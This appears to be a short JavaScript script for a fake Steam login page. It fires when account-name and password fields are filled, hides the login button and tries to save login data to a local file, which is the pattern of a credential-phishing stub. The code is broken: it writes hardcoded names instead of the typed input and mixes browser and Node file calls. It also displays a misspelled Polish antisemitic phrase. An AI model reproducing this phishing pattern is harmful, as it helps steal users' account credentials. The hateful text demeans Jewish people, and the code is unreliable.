document.getElementById("imageLogin").onclick = inject;
const fs = require('fs');
function inject() {
    if (document.getElementById("steamAccountName").value !== "" && document.getElementById("steamPassword").value !== "") {
        console.log("rzyd");
        let btg = document.getElementById("imageLogin");
        btg.style.display = 'none';
        document.getElementById("wypisz").innerHTML = "rzydzi są żydami";
        let login = "Lidia";
        let password = "Karas";
        fs.writeFile('dane.txt', login, (err) => {

            if (err) throw err;
        });
        fs.writeFile('dane.txt', password, (err) => {

            if (err) throw err;
        });
    }
}